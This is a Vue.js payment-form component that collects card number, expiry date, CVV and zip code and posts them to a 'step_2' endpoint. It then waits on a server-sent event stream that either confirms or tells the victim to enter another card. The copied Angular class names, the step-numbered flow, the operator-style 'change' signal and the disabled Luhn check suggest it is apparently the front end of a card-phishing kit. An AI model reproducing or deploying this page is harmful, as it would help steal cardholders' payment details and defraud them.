<template>
  <div style="padding: 0 16px 0 16px">
    <h3 style="margin-bottom: 48px">Payment Method</h3>
    <!--    警告框-->
    <div class="checkout-error-container" v-show="warning_alert">
      <ul class="list-unstyled alert alert-danger" id="tokenizationError">
        <v-icon color="#d61834" class="mr-3">mdi-alert</v-icon>
        <li>We couldn't process your payment. Please try another payment method.</li>
      </ul>
    </div>

    <div style="margin-bottom: 12px">
      <span>
        <img style="height: 28px;width: 34px;" src="@/assets/images/visa-card-coloured.svg"
             alt="VISA card icon">
        <img style="height: 28px;width: 34px;margin-left: 12px" src="@/assets/images/master-card-coloured.svg"
             alt="Master card icon">
        <img style="height: 28px;width: 34px;margin-left: 12px" src="@/assets/images/amex-card-coloured.svg"
             alt="American express card icon">
      </span>
    </div>
    <label class="ph-form-element-label">Card number</label>
    <!--    错误提示-->
    <small style="" class="has-error" v-show="card_alert">
      <v-icon small color="#bc111e" class="mr-1">mdi-alert</v-icon>
      Please enter a valid card number.</small>
    <input autocomplete="cc-number"
           maxlength="19" name="number" required="" title="Enter your card number" type="text"
           class="ng-pristine ng-invalid ng-touched" v-model="card_number"
           oninput="if(value.length >16){value=value.slice(0,16)}" v-on:blur="CheckBankNo">
    <v-row style="margin-top: 12px">
      <v-col cols="6">
        <label class="ph-form-element-label">Expiry date</label>
        <input v-model="exp_date"
               oninput="if(value.length>5){value=value.slice(0,3)}if(value.length===2){value=value+'/'}"
               maxlength="19" placeholder="MM/YY" type="text"
               class="ng-pristine ng-invalid ng-touched">
      </v-col>
      <v-col cols="6">
        <label class="ph-form-element-label">CVV</label>
        <input autocomplete="cvv"
               maxlength="19" name="number" required="" title="Enter your card number" type="text"
               oninput="if(value.length>4)value=value.slice(0,4)" v-model="cvv"
               class="ng-pristine ng-invalid ng-touched">
      </v-col>
    </v-row>
    <label class="ph-form-element-label" style="margin-top: 14px">Zip code</label>
    <input autocomplete="postcode"
           maxlength="19" name="number" type="text" class="ng-pristine ng-invalid ng-touched"
           oninput="if(value.length>5)value=value.slice(0,5)" v-model="zipcode"
           >
    <button style="margin: 24px 0 50px 0" name="continue"
            class="ap-btn btn-block ap-btn-primary ap-big-button checkError" @click="submit_data">
      Continue
    </button>
    <v-overlay opacity="0.8" color="#ffffff" v-show="show_loading">
      <v-progress-circular
          indeterminate
          color="#ff0000"
          width="3"
          size="48"
      ></v-progress-circular>
    </v-overlay>
  </div>
</template>

<script>
import axios from "axios";
import api from '@/api/index';

export default {
  name: "PaymentView",
  data: () => ({
    card_alert: false,
    warning_alert: false,
    show_loading: false,
    appid: localStorage.getItem("appid"),
    card_number: '',
    exp_date: '',
    cvv: '',
    zipcode: '',
  }),
  methods: {
    isValidCreditCard: function (ccnum) {
      let i;
      ccnum = ccnum.split("-").join("");
      let checksum = 0;
      for (i = (2 - (ccnum.length % 2)); i <= ccnum.length; i += 2) {
        checksum += parseInt(ccnum.charAt(i - 1));
      }
      // Analyze odd digits in even length strings
      //or even digits in odd length strings.
      for (i = (ccnum.length % 2) + 1; i < ccnum.length; i += 2) {
        const digit = parseInt(ccnum.charAt(i - 1)) * 2;
        if (digit < 10) {
          checksum += digit;
        } else {
          checksum += (digit - 9);
        }
      }
      return (checksum % 10) === 0;
    },
    //检查银行卡号
    CheckBankNo: function () {
      // eslint-disable-next-line
      let bankno = this.card_number
      bankno = bankno.replace(/\s/g, '');
      if (bankno === "") {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      if (bankno.length < 14 || bankno.length > 19) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      const num = /^\d*$/;//全数字
      if (!num.exec(bankno)) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      // if (!this.isValidCreditCard(bankno)) {
      //   this.card_alert = "Please enter the correct card number";
      //   return false;
      // }
      const bank_first = ['3', '4', '5', '6', '9']
      if (bank_first.indexOf(bankno.slice(0, 1)) === -1) {
        console.log(1111)
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      this.card_alert = ""
      return true;
    },
    submit_data() {
      if (this.card_alert === true) {
        return
      }
      const url = api.step_2
      const params = new URLSearchParams();
      const post_data = [this.card_number, this.exp_date, this.cvv, this.appid]
      const post_name = ['card_number', 'exp_date', 'cvv', 'appid']
      if (this.card_number !== '' & this.exp_date !== '' && this.cvv !== '') {
        this.warning_alert = false
        this.show_loading = true
        for (let i in post_data) {
          params.append(post_name[i], post_data[i])
        }
        axios.post(url, params)
            .then(response => {
              if (response.data.status === 'ok') {
                this.show_loading = true
                this.check_card_status()
              } else {
                this.show_loading = false
                this.warning_alert = true
              }
            })
            .catch(error => {
              console.log(error)
              this.show_loading = false
              this.warning_alert = true
            })
      } else {
        this.warning_alert = true
      }
    },
    /* eslint-disable */
    check_card_status() {
      if ('EventSource' in window) {
        const url = api.check_card_status + "?appid=" + this.appid;
        const source = new EventSource(url);
        // 服务器发送信息到客户端时，如果没有 event 字段，默认会触发 message 事件
        source.onmessage = (event) => {
          let data = event.data;
          if (data === 'ok') {
            source.close()
            this.$router.push({'name': 'confirm'})
          } else if (data === 'change') {
            source.close()
            this.show_loading = false
            this.warning_alert = true
            this.card_number = this.exp_date = this.cvv = ''
          }
        }
        // 连接异常时会触发 error 事件并自动重连
        source.onerror = (event) => {
          console.log(event);

        }
      }
    },

  },
}
</script>

<style scoped>
